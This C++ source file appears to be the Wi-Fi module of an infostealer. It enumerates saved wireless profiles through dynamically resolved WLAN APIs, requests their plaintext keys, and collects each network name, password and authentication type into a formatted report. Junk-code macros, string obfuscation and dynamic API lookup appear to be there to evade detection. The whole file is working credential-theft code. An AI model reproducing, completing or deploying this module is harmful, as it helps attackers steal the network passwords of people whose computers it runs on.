 
#include "WiFi.h"
#include "../utils/Config.h"
#include "../utils/DynamicAPI.h"
#include "../core/Obfuscation.h"
#include <wlanapi.h>
#include <string>
#include <sstream>
#include <regex>
#include "../../DebugLog.h"
namespace Modules {
    static std::wstring XmlTagW(const std::wstring& xml, const std::wstring& tag) {
        std::wstring open  = L"<" + tag  + L">";
        std::wstring close = L"</" + tag + L">";
        auto s = xml.find(open);
        auto e = xml.find(close);
        if (s == std::wstring::npos || e == std::wstring::npos) return L"";
        return xml.substr(s + open.size(), e - s - open.size());
    }
    static std::string WideToUtf8(const std::wstring& w) {
        if (w.empty()) return "";
        int sz = WideCharToMultiByte(CP_UTF8, 0, w.c_str(), -1, nullptr, 0, nullptr, nullptr);
        std::string s(sz, 0);
        WideCharToMultiByte(CP_UTF8, 0, w.c_str(), -1, &s[0], sz, nullptr, nullptr);
        s.resize(sz - 1);
        return s;
    }
    std::vector<WiFiRecord> WiFi::Grab() {
        JUNK_CODE_LARGE
        SLOG("[*] Searching for saved WiFi profiles...");
        std::vector<WiFiRecord> out;
        if (!DynAPI::WlanOpen || !DynAPI::WlanClose ||
            !DynAPI::WlanEnumIfaces || !DynAPI::WlanGetProfList ||
            !DynAPI::WlanGetProf || !DynAPI::WlanFree) return out;
        DWORD ver = 0;
        HANDLE hClient = nullptr;
        if (DynAPI::WlanOpen(2, nullptr, &ver, &hClient) != ERROR_SUCCESS) return out;
        PWLAN_INTERFACE_INFO_LIST pIfList = nullptr;
        if (DynAPI::WlanEnumIfaces(hClient, nullptr, &pIfList) != ERROR_SUCCESS) {
            DynAPI::WlanClose(hClient, nullptr);
            return out;
        }
        for (DWORD i = 0; i < pIfList->dwNumberOfItems; ++i) {
            const GUID& ifGuid = pIfList->InterfaceInfo[i].InterfaceGuid;
            PWLAN_PROFILE_INFO_LIST pProfList = nullptr;
            if (DynAPI::WlanGetProfList(hClient, &ifGuid, nullptr, &pProfList) != ERROR_SUCCESS) continue;
            for (DWORD j = 0; j < pProfList->dwNumberOfItems; ++j) {
                LPWSTR pXml = nullptr;
                DWORD flags = WLAN_PROFILE_GET_PLAINTEXT_KEY;
                DWORD grant = 0;
                if (DynAPI::WlanGetProf(hClient, &ifGuid, pProfList->ProfileInfo[j].strProfileName,
                    nullptr, &pXml, &flags, &grant) == ERROR_SUCCESS && pXml) {
                    std::wstring xml(pXml);
                    DynAPI::WlanFree(pXml);
                    std::wstring ssid     = XmlTagW(xml, L"name");
                    std::wstring keyMat   = XmlTagW(xml, L"keyMaterial");
                    std::wstring authAlg  = XmlTagW(xml, L"authentication");
                    WiFiRecord r;
                    r.SSID     = WideToUtf8(ssid);
                    r.Password = WideToUtf8(keyMat);
                    r.Auth     = WideToUtf8(authAlg);
                    if (!r.SSID.empty()) out.push_back(r);
                }
            }
            DynAPI::WlanFree(pProfList);
        }
        DynAPI::WlanFree(pIfList);
        DynAPI::WlanClose(hClient, nullptr);
        if (!out.empty()) SLOG("[+] Recovered %zu WiFi profiles.", out.size());
        else SLOG("[-] No WiFi profiles recovered.");
        return out;
    }
    std::string WiFi::Format(const std::vector<WiFiRecord>& data) {
        if (data.empty()) return S("No saved WiFi profiles found.\n");
        std::stringstream ss;
        int n = 1;
        for (auto& r : data) {
            ss << S("WiFi #") << n++ << "\n";
            ss << S("  SSID     : ") << r.SSID     << "\n";
            ss << S("  Password : ") << r.Password  << "\n";
            ss << S("  Auth     : ") << r.Auth      << "\n\n";
        }
        return ss.str();
    }
}
